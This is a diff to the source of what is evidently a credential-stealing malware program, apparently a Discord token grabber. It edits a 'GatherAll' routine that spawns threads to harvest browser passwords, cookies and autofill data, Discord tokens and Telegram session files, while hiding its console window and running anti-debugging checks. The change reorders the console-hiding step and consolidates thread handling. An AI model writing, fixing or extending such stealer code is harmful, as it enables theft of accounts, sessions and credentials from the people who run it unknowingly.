@@ -831,7 +831,6 @@ def get_discord_connections(tokq):
 
         return connections_list
     else:
-        print('error')
         return []
     
 def uploadTokq(Tokq, path):
@@ -1931,13 +1930,6 @@ def GatherAll():
     ]
     Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
     aa = []
-    qq = []
-    if hidewindow == True:
-        try:
-            hide_console1()
-            hide_console2()
-        except:
-            pass
     try:
         if antidebugging == True:
             ad = threading.Thread(target=antidebug)
@@ -1947,6 +1939,14 @@ def GatherAll():
             pass
     except:
         pass
+    
+    if hidewindow == True:
+        try:
+            hide_console1()
+            hide_console2()
+        except:
+            pass
+
     
     getinf = threading.Thread(target=getinfo)
     getinf.start()
@@ -1968,22 +1968,22 @@ def GatherAll():
     for patt in browserPaths:
         pa = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
         pa.start()
-        qq.append(pa)
+        aa.append(pa)
         
     for patt in browserPaths: 
         getc = threading.Thread(target=getCook, args=[patt[0], patt[4]])
         getc.start()
-        qq.append(getc)
+        aa.append(getc)
         
         
     for patt in browserPaths:
         autof = threading.Thread(target=getAutofill,args=[patt[0], patt[3]])
         autof.start()
-        qq.append(autof)
+        aa.append(autof)
         
     frfc = threading.Thread(target=frcook)
     frfc.start()
-    qq.append(frfc)
+    aa.append(frfc)
         
     for patt in browserPaths:
         tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
@@ -2000,7 +2000,7 @@ def GatherAll():
         aa.append(di)
 
     
-    for thread in qq:
+    for thread in aa:
         thread.join()
         
     paaz_thread = threading.Thread(target=paaz)
